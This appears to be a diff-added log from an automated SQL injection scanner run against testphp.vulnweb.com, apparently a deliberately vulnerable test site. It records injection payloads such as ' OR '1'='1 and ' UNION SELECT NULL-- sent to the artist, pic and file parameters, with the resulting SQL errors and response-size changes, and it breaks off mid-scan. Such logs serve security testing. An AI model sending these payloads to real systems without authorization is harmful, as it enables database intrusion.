+2025-11-06 11:09:48,288 INFO: Testing parameters at: http://testphp.vulnweb.com/artists.php?artist=1
+2025-11-06 11:09:49,872 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%27
+2025-11-06 11:09:49,872 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%27
+2025-11-06 11:09:50,687 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%27+OR+%271%27%3D%271
+2025-11-06 11:09:50,688 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%27+OR+%271%27%3D%271
+2025-11-06 11:09:51,486 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%22
+2025-11-06 11:09:51,487 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%22
+2025-11-06 11:09:52,271 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%22+OR+%221%22%3D%221
+2025-11-06 11:09:52,272 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%22+OR+%221%22%3D%221
+2025-11-06 11:09:53,087 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%60
+2025-11-06 11:09:53,088 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%60
+2025-11-06 11:09:54,048 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%27%29--
+2025-11-06 11:09:54,048 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%27%29--
+2025-11-06 11:09:54,854 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%27+UNION+SELECT+NULL--
+2025-11-06 11:09:54,855 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%27+UNION+SELECT+NULL--
+2025-11-06 11:09:55,820 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%27+OR+1%3D1--
+2025-11-06 11:09:55,821 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%27+OR+1%3D1--
+2025-11-06 11:09:56,770 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=1%22+OR+1%3D1--
+2025-11-06 11:09:56,771 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=1%22+OR+1%3D1--
+2025-11-06 11:09:57,570 INFO: Testing parameters at: http://testphp.vulnweb.com/artists.php?artist=2
+2025-11-06 11:09:59,152 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%27
+2025-11-06 11:09:59,153 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%27
+2025-11-06 11:09:59,952 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%27+OR+%271%27%3D%271
+2025-11-06 11:09:59,953 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%27+OR+%271%27%3D%271
+2025-11-06 11:10:00,769 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%22
+2025-11-06 11:10:00,769 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%22
+2025-11-06 11:10:01,602 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%22+OR+%221%22%3D%221
+2025-11-06 11:10:01,603 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%22+OR+%221%22%3D%221
+2025-11-06 11:10:02,386 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%60
+2025-11-06 11:10:02,387 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%60
+2025-11-06 11:10:03,186 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%27%29--
+2025-11-06 11:10:03,187 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%27%29--
+2025-11-06 11:10:03,986 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%27+UNION+SELECT+NULL--
+2025-11-06 11:10:03,986 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%27+UNION+SELECT+NULL--
+2025-11-06 11:10:04,818 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%27+OR+1%3D1--
+2025-11-06 11:10:04,820 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%27+OR+1%3D1--
+2025-11-06 11:10:05,636 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=2%22+OR+1%3D1--
+2025-11-06 11:10:05,636 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=2%22+OR+1%3D1--
+2025-11-06 11:10:06,435 INFO: Testing parameters at: http://testphp.vulnweb.com/artists.php?artist=3
+2025-11-06 11:10:08,121 INFO: [SQLi] artist=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%27
+2025-11-06 11:10:08,121 INFO: [SQLi-LEN] artist=' caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%27
+2025-11-06 11:10:09,084 INFO: [SQLi] artist=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%27+OR+%271%27%3D%271
+2025-11-06 11:10:09,085 INFO: [SQLi-LEN] artist=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%27+OR+%271%27%3D%271
+2025-11-06 11:10:09,870 INFO: [SQLi] artist=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%22
+2025-11-06 11:10:09,870 INFO: [SQLi-LEN] artist=" caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%22
+2025-11-06 11:10:10,703 INFO: [SQLi] artist=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%22+OR+%221%22%3D%221
+2025-11-06 11:10:10,703 INFO: [SQLi-LEN] artist=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%22+OR+%221%22%3D%221
+2025-11-06 11:10:11,651 INFO: [SQLi] artist=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%60
+2025-11-06 11:10:11,652 INFO: [SQLi-LEN] artist=` caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%60
+2025-11-06 11:10:12,618 INFO: [SQLi] artist=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%27%29--
+2025-11-06 11:10:12,618 INFO: [SQLi-LEN] artist=')-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%27%29--
+2025-11-06 11:10:13,568 INFO: [SQLi] artist=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%27+UNION+SELECT+NULL--
+2025-11-06 11:10:13,569 INFO: [SQLi-LEN] artist=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%27+UNION+SELECT+NULL--
+2025-11-06 11:10:14,351 INFO: [SQLi] artist=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%27+OR+1%3D1--
+2025-11-06 11:10:14,352 INFO: [SQLi-LEN] artist=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%27+OR+1%3D1--
+2025-11-06 11:10:15,167 INFO: [SQLi] artist=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/artists.php?artist=3%22+OR+1%3D1--
+2025-11-06 11:10:15,168 INFO: [SQLi-LEN] artist=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/artists.php?artist=3%22+OR+1%3D1--
+2025-11-06 11:10:15,968 INFO: Testing parameters at: http://testphp.vulnweb.com/hpp/?pp=12
+2025-11-06 11:10:25,234 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=1
+2025-11-06 11:10:27,008 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%27
+2025-11-06 11:10:27,009 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%27
+2025-11-06 11:10:27,966 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%27+OR+%271%27%3D%271
+2025-11-06 11:10:27,966 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%27+OR+%271%27%3D%271
+2025-11-06 11:10:28,799 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%22
+2025-11-06 11:10:28,800 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%22
+2025-11-06 11:10:29,732 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%22+OR+%221%22%3D%221
+2025-11-06 11:10:29,733 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%22+OR+%221%22%3D%221
+2025-11-06 11:10:30,549 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%60
+2025-11-06 11:10:30,550 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%60
+2025-11-06 11:10:31,349 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%27%29--
+2025-11-06 11:10:31,349 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%27%29--
+2025-11-06 11:10:32,299 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%27+UNION+SELECT+NULL--
+2025-11-06 11:10:32,299 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%27+UNION+SELECT+NULL--
+2025-11-06 11:10:33,065 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%27+OR+1%3D1--
+2025-11-06 11:10:33,065 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%27+OR+1%3D1--
+2025-11-06 11:10:33,884 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=1%22+OR+1%3D1--
+2025-11-06 11:10:33,885 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=1%22+OR+1%3D1--
+2025-11-06 11:10:34,682 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg
+2025-11-06 11:10:36,764 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27
+2025-11-06 11:10:37,732 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27+OR+%271%27%3D%271
+2025-11-06 11:10:38,565 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%22
+2025-11-06 11:10:39,480 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%22+OR+%221%22%3D%221
+2025-11-06 11:10:40,301 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%60
+2025-11-06 11:10:41,247 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27%29--
+2025-11-06 11:10:42,048 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27+UNION+SELECT+NULL--
+2025-11-06 11:10:42,848 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%27+OR+1%3D1--
+2025-11-06 11:10:43,814 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F1.jpg%22+OR+1%3D1--
+2025-11-06 11:10:44,764 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=2
+2025-11-06 11:10:46,696 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%27
+2025-11-06 11:10:46,697 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%27
+2025-11-06 11:10:47,629 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%27+OR+%271%27%3D%271
+2025-11-06 11:10:47,631 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%27+OR+%271%27%3D%271
+2025-11-06 11:10:48,446 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%22
+2025-11-06 11:10:48,447 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%22
+2025-11-06 11:10:49,397 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%22+OR+%221%22%3D%221
+2025-11-06 11:10:49,397 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%22+OR+%221%22%3D%221
+2025-11-06 11:10:50,229 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%60
+2025-11-06 11:10:50,230 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%60
+2025-11-06 11:10:51,028 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%27%29--
+2025-11-06 11:10:51,029 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%27%29--
+2025-11-06 11:10:51,979 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%27+UNION+SELECT+NULL--
+2025-11-06 11:10:51,980 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%27+UNION+SELECT+NULL--
+2025-11-06 11:10:52,829 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%27+OR+1%3D1--
+2025-11-06 11:10:52,829 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%27+OR+1%3D1--
+2025-11-06 11:10:53,725 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=2%22+OR+1%3D1--
+2025-11-06 11:10:53,726 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=2%22+OR+1%3D1--
+2025-11-06 11:10:54,695 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg
+2025-11-06 11:10:56,595 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27
+2025-11-06 11:10:57,396 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27+OR+%271%27%3D%271
+2025-11-06 11:10:58,213 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%22
+2025-11-06 11:10:59,162 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%22+OR+%221%22%3D%221
+2025-11-06 11:10:59,951 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%60
+2025-11-06 11:11:00,761 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27%29--
+2025-11-06 11:11:01,726 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27+UNION+SELECT+NULL--
+2025-11-06 11:11:02,578 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%27+OR+1%3D1--
+2025-11-06 11:11:03,361 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F2.jpg%22+OR+1%3D1--
+2025-11-06 11:11:04,296 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=3
+2025-11-06 11:11:06,159 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%27
+2025-11-06 11:11:06,160 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%27
+2025-11-06 11:11:06,942 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%27+OR+%271%27%3D%271
+2025-11-06 11:11:06,943 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%27+OR+%271%27%3D%271
+2025-11-06 11:11:07,810 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%22
+2025-11-06 11:11:07,811 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%22
+2025-11-06 11:11:08,609 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%22+OR+%221%22%3D%221
+2025-11-06 11:11:08,609 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%22+OR+%221%22%3D%221
+2025-11-06 11:11:09,407 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%60
+2025-11-06 11:11:09,408 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%60
+2025-11-06 11:11:10,177 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%27%29--
+2025-11-06 11:11:10,177 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%27%29--
+2025-11-06 11:11:10,954 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%27+UNION+SELECT+NULL--
+2025-11-06 11:11:10,955 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%27+UNION+SELECT+NULL--
+2025-11-06 11:11:11,742 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%27+OR+1%3D1--
+2025-11-06 11:11:11,743 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%27+OR+1%3D1--
+2025-11-06 11:11:12,542 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=3%22+OR+1%3D1--
+2025-11-06 11:11:12,542 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=3%22+OR+1%3D1--
+2025-11-06 11:11:13,325 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg
+2025-11-06 11:11:14,925 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27
+2025-11-06 11:11:15,709 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27+OR+%271%27%3D%271
+2025-11-06 11:11:16,475 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%22
+2025-11-06 11:11:17,275 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%22+OR+%221%22%3D%221
+2025-11-06 11:11:18,058 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%60
+2025-11-06 11:11:18,842 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27%29--
+2025-11-06 11:11:19,641 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27+UNION+SELECT+NULL--
+2025-11-06 11:11:20,457 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%27+OR+1%3D1--
+2025-11-06 11:11:21,243 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F3.jpg%22+OR+1%3D1--
+2025-11-06 11:11:22,024 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=4
+2025-11-06 11:11:23,624 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%27
+2025-11-06 11:11:23,624 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%27
+2025-11-06 11:11:24,425 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%27+OR+%271%27%3D%271
+2025-11-06 11:11:24,425 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%27+OR+%271%27%3D%271
+2025-11-06 11:11:25,241 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%22
+2025-11-06 11:11:25,242 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%22
+2025-11-06 11:11:26,024 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%22+OR+%221%22%3D%221
+2025-11-06 11:11:26,025 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%22+OR+%221%22%3D%221
+2025-11-06 11:11:26,840 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%60
+2025-11-06 11:11:26,841 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%60
+2025-11-06 11:11:27,640 INFO: [SQLi] pic=')-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%27%29--
+2025-11-06 11:11:27,641 INFO: [SQLi-LEN] pic=')-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%27%29--
+2025-11-06 11:11:28,440 INFO: [SQLi] pic=' UNION SELECT NULL-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%27+UNION+SELECT+NULL--
+2025-11-06 11:11:28,441 INFO: [SQLi-LEN] pic=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%27+UNION+SELECT+NULL--
+2025-11-06 11:11:29,240 INFO: [SQLi] pic=' OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%27+OR+1%3D1--
+2025-11-06 11:11:29,241 INFO: [SQLi-LEN] pic=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%27+OR+1%3D1--
+2025-11-06 11:11:30,040 INFO: [SQLi] pic=" OR 1=1-- -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=4%22+OR+1%3D1--
+2025-11-06 11:11:30,042 INFO: [SQLi-LEN] pic=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/product.php?pic=4%22+OR+1%3D1--
+2025-11-06 11:11:30,823 INFO: Testing parameters at: http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg
+2025-11-06 11:11:32,924 INFO: [SQLi-LEN] file=' caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27
+2025-11-06 11:11:33,723 INFO: [SQLi-LEN] file=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27+OR+%271%27%3D%271
+2025-11-06 11:11:34,540 INFO: [SQLi-LEN] file=" caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%22
+2025-11-06 11:11:35,491 INFO: [SQLi-LEN] file=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%22+OR+%221%22%3D%221
+2025-11-06 11:11:36,323 INFO: [SQLi-LEN] file=` caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%60
+2025-11-06 11:11:37,107 INFO: [SQLi-LEN] file=')-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27%29--
+2025-11-06 11:11:37,907 INFO: [SQLi-LEN] file=' UNION SELECT NULL-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27+UNION+SELECT+NULL--
+2025-11-06 11:11:38,840 INFO: [SQLi-LEN] file=' OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%27+OR+1%3D1--
+2025-11-06 11:11:39,623 INFO: [SQLi-LEN] file=" OR 1=1-- caused response size delta at http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F4.jpg%22+OR+1%3D1--
+2025-11-06 11:11:40,440 INFO: Testing parameters at: http://testphp.vulnweb.com/product.php?pic=5
+2025-11-06 11:11:42,022 INFO: [SQLi] pic=' -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%27
+2025-11-06 11:11:42,023 INFO: [SQLi-LEN] pic=' caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%27
+2025-11-06 11:11:42,837 INFO: [SQLi] pic=' OR '1'='1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%27+OR+%271%27%3D%271
+2025-11-06 11:11:42,839 INFO: [SQLi-LEN] pic=' OR '1'='1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%27+OR+%271%27%3D%271
+2025-11-06 11:11:43,655 INFO: [SQLi] pic=" -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%22
+2025-11-06 11:11:43,656 INFO: [SQLi-LEN] pic=" caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%22
+2025-11-06 11:11:44,439 INFO: [SQLi] pic=" OR "1"="1 -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%22+OR+%221%22%3D%221
+2025-11-06 11:11:44,439 INFO: [SQLi-LEN] pic=" OR "1"="1 caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%22+OR+%221%22%3D%221
+2025-11-06 11:11:45,253 INFO: [SQLi] pic=` -> you have an error in your sql syntax @ http://testphp.vulnweb.com/product.php?pic=5%60
+2025-11-06 11:11:45,254 INFO: [SQLi-LEN] pic=` caused response size delta at http://testphp.vulnweb.com/product.php?pic=5%60
